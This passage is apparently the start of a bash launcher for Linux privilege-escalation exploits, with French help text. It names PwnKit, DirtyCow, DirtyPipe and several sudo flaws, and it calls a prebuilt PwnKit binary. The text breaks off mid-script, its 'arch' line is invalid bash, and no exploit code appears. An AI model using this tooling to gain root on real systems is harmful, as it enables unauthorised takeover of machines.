#!/bin/bash

arch=${64 || 32}

if [[ "$*" == "-help" ]]; then
    echo "Commande :"
    echo "  -PwnKit64/32   : Exploite PwnKit en architecture 64/32"
    echo "  -DirtyCow      : Exploite DirtyCow"
    echo "  -DirtyPipe     : Exploite DirtyPipe"
    echo "  -Chwoot        : Exploite Sudo Chroot"
    echo "  -SudoHost      : Exploite Sudo Hostname "
    echo "  -Baron         : Exploite sudo_Baron"
    echo "  -check         : Verifie si gcc est installer"
    exit 0
fi

if [[ "$*" == "-PwnKit${arch}" ]]; then
    "${PWD}/exploit/PwnKit/PwnKit${arch}"
